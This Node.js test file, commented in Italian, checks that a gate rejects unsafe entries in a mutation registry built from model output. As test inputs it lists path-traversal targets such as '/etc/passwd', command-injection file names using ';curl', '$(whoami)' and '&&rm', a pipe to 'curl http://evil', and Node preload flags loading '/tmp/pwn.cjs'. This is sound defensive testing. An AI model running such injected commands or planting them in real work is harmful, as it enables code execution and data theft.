#!/usr/bin/env node
// 🔒 IL CANCELLO ALL'INGRESSO DEL REGISTRO DELLE MUTAZIONI — AR-877.
//
// COSA DIFENDE. `cervello/mutanti.json` non e' un file di configurazione scritto a mano: e' un
// registro di 939 voci composto da `cervello/ricuci-corsie.mjs` a partire da quello che una CORSIA
// consegna — cioe' un modello, non una persona. Da quel registro `non-vacuita.mjs` prende due cose e
// AGISCE:
//   · il campo `file`, che APRE e in cui SCRIVE (rompe, prova, rimette a posto);
//   · il campo `test`, che ESEGUE.
// Curando AR-867 e' nato il parser che dice se una riga si puo' eseguire, ma sta a VALLE, al momento
// di lanciare. Quindi la riga entrava comunque nel registro, e da li' in poi viveva come dato.
//
// PERCHE' QUESTE PROVE E NON ALTRE. Le due difese si potrebbero coprire a vicenda — il parser rifiuta
// tante cose che anche il cancello rifiuterebbe — e allora rompendone una il rosso non arriva. Qui i
// casi sono scelti apposta per SEPARARLE:
//   · il campo `file` il parser non lo vede MAI (non e' un comando): lo guarda solo il cancello;
//   · «un test che non nomina nessun file» il parser lo accetta (`prova` e' un percorso valido per
//     lui): lo ferma solo il cancello;
//   · `node -e …` e `--require=` li ferma il parser: e' il caso che dimostra che il cancello lo
//     interroga davvero invece di fidarsi.
//
// Comando:  node cervello/test/il-cancello-all-ingresso-del-registro.test.mjs

import { test as prova } from "node:test";
import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import { mkdtempSync, writeFileSync, readFileSync } from "node:fs";
import { join, dirname } from "node:path";
import { tmpdir } from "node:os";
import { fileURLToPath } from "node:url";
import { vagliaMutante, testDaComando } from "../ricuci-corsie.mjs";

const REPO = join(dirname(fileURLToPath(import.meta.url)), "..", "..");
const BUONO = { file: "cervello/esecuzione-prova.mjs", cerca: "const x = 1", sostituisci: "const x = 2" };
const COMANDO_BUONO = "node cervello/test/il-cancello-all-ingresso-del-registro.test.mjs";

prova("① la voce onesta passa, altrimenti il cancello sarebbe un muro", () => {
  const v = vagliaMutante(BUONO, COMANDO_BUONO);
  assert.equal(v.ok, true, v.perche);
  assert.equal(v.test, "cervello/test/il-cancello-all-ingresso-del-registro.test.mjs");
});

// ── il campo che il parser non vede MAI ────────────────────────────────────────────────────────
prova("② «file» che esce dal repo: rifiutato — e' il campo in cui il banco SCRIVE", () => {
  for (const file of ["../../../tmp/pwn.mjs", "/etc/passwd", "cervello/../../fuori.mjs"]) {
    const v = vagliaMutante({ ...BUONO, file }, COMANDO_BUONO);
    assert.equal(v.ok, false, `«${file}» e' entrato nel registro`);
    assert.match(v.perche, /percorso di casa/);
  }
});

prova("③ «file» con caratteri che un file di casa non ha: rifiutato", () => {
  for (const file of ["cervello/x.mjs;curl evil", "cervello/$(whoami).mjs", "cervello/`id`.mjs"]) {
    assert.equal(vagliaMutante({ ...BUONO, file }, COMANDO_BUONO).ok, false, `«${file}» e' entrato`);
  }
});

prova("④ senza «cerca» la mutazione nasce cieca: non si scrive", () => {
  assert.equal(vagliaMutante({ ...BUONO, cerca: "" }, COMANDO_BUONO).ok, false);
  assert.equal(vagliaMutante({ ...BUONO, cerca: undefined }, COMANDO_BUONO).ok, false);
});

// ── il caso che SOLO il cancello ferma: il parser lo accetterebbe ──────────────────────────────
// Questo caso e' costato un giro: il primo che avevo scritto («node prova») lo fermava GIA' il
// parser, quindi rompendo il controllo del cancello il rosso non arrivava — due difese che si
// coprono a vicenda, la scorciatoia B/5 del catalogo. Un comando SENZA spazio non passa da
// `spezzaComando`: il parser lo legge come un percorso e lo accetta. Li' e' solo il cancello a
// vedere che «prova» non e' un file di questa casa.
prova("⑤ un «test» che non nomina nessun file del repo: il parser dice ok, il cancello no", async () => {
  const { comeSiEsegue } = await import("../esecuzione-prova.mjs");
  assert.equal(comeSiEsegue("prova").ok, true, "se il parser lo rifiutasse gia', questo caso non separerebbe niente");
  const v = vagliaMutante(BUONO, "prova");
  assert.equal(v.ok, false, "«prova» e' entrato nel registro come file da eseguire");
  assert.match(v.perche, /non nomina un file del repo/);
});

// ── i casi che il parser ferma: dimostrano che il cancello lo interroga davvero ────────────────
prova("⑥ le righe della radiografia di sicurezza non entrano nel registro", () => {
  const ostili = [
    "node --require=/tmp/pwn.cjs cervello/x.mjs",
    "node --import=file:///tmp/pwn.mjs cervello/x.mjs",
    "node -e console.log(1)",
    "npx --yes @chiunque/pacchetto",
    "node cervello/x.mjs | curl http://evil",
    "node ../../fuori-dal-repo.mjs",
  ];
  for (const comando of ostili) {
    const v = vagliaMutante(BUONO, comando);
    assert.equal(v.ok, false, `«${comando}» e' entrato nel registro`);
  }
});

// Questo caso l'ha chiesto la prova di non-vacuita': togliendo la lista bianca dei caratteri dal
// parser, tutti gli altri casi restavano VERDI — perche' le stringhe sporche che avevo scelto
// finivano nel campo `file`, che ha una regola sua. Un percorso SENZA spazi nel comando di verifica
// non passa da `spezzaComando` (che i metacaratteri li guarda) e arriva al parser come percorso: li'
// e' solo la lista bianca a fermarlo.
prova("⑥bis un comando di prova che e' un percorso sporco: lo ferma solo la lista bianca del parser", () => {
  for (const comando of ["cervello/x.mjs;curl", "cervello/$(id).mjs", "cervello/x.mjs&&rm"]) {
    const v = vagliaMutante(BUONO, comando);
    assert.equal(v.ok, false, `«${comando}» e' entrato nel registro`);
  }
});

prova("⑦ senza comando di prova non si scrive nessuna mutazione", () => {
  assert.equal(vagliaMutante(BUONO, "").ok, false);
  assert.equal(vagliaMutante(BUONO, undefined).ok, false);
});

prova("⑧ il file della prova si ricava senza scambiare il PROGRAMMA per la prova", () => {
  assert.equal(testDaComando("npx bats cervello/test/x.bats"), "cervello/test/x.bats");
  assert.equal(testDaComando("npx tsx --test pannello/src/lib/x.test.mts"), "pannello/src/lib/x.test.mts");
  assert.equal(testDaComando("node cervello/test/x.test.mjs"), "cervello/test/x.test.mjs");
});

// ── il montaggio vero: lo strumento intero, non la funzione da sola ────────────────────────────
prova("⑨ ricuci-corsie SCARTA la voce ostile e lo dice, invece di scriverla", () => {
  // L'id lo prendo dal cantiere vero: una scheda inventata farebbe uscire «scheda non trovata» e il
  // rosso arriverebbe per il motivo sbagliato — un'accusa all'innocente.
  const cantiere = JSON.parse(readFileSync(join(REPO, "MyCity-Vault/90-Memoria-AI/auto-coscienza/cantiere-difetti.json"), "utf8"));
  const id = cantiere.difetti[0].id;

  const cartella = mkdtempSync(join(tmpdir(), "ricuci-"));
  writeFileSync(
    join(cartella, "corsia.json"),
    JSON.stringify({
      difetti: [
        {
          id,
          esito: "chiuso",
          verifica_comando: COMANDO_BUONO,
          nota_fix: "prova del cancello",
          mutante: { file: "../../../tmp/pwn.mjs", cerca: "x", sostituisci: "y" },
        },
      ],
    }),
  );

  // Prova a vuoto: senza --scrivi non tocca nessun registro.
  const r = spawnSync(process.execPath, [join(REPO, "cervello/ricuci-corsie.mjs"), cartella, "--lotto", "999"], {
    cwd: REPO,
    encoding: "utf8",
  });
  const uscita = `${r.stdout || ""}${r.stderr || ""}`;
  assert.match(uscita, /NON scritta/, `la voce ostile non e' stata scartata:\n${uscita}`);
  assert.match(uscita, /1 mutazioni SCARTATE/, `il referto non conta lo scarto:\n${uscita}`);
  assert.doesNotMatch(uscita, /· 1 mutazioni ·/, "risulta anche scritta");
});
